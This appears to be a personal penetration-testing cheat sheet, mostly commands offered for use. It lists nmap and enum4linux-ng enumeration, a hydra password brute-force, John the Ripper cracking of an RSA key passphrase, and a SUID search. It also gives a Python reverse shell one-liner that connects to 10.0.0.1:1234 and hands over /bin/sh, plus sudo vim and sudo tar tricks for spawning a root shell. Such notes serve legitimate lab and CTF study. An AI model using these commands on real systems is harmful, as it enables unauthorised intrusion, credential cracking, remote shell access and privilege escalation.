# NMAP Basic scan with outfile 

nmap -sC -sV -oN /path/to/file ip

# Enum4linux-ng


**_enumerating smb clients and servers_**

_use example_

python3 enum4linux-ng.py -U -A -R ip

# Hydra example

hydra -l username -P /path/to/wordlist proto://ip

# Cracking the passphrase of an rsa key with John

sh2john.py rsa_file > file.txt
john file.txt

#Checkin for suid on a system run the following commands
find / -perm -u=s -type f 2>/dev/null

# Different ways to read a file

while read line; do echo $line done; < file
cat file
grep . file


# Pentestmonkey reverse shell examples
_in python it would be, note that if the machine doesnt have python2 installed(modern machines) it works with python3_

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


#Privilege scalation with vim

there are 2 ways of running a shell as root with vim

##_First option_
sudo vim 
 -> :set shell=/bin/sh
 -> :shell

##_Second option_
sudo vim -c ':!/bin/sh'


#Privilege scalation with tar

If the user is allowed in the sudoers file we can easily become root by running _sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh_


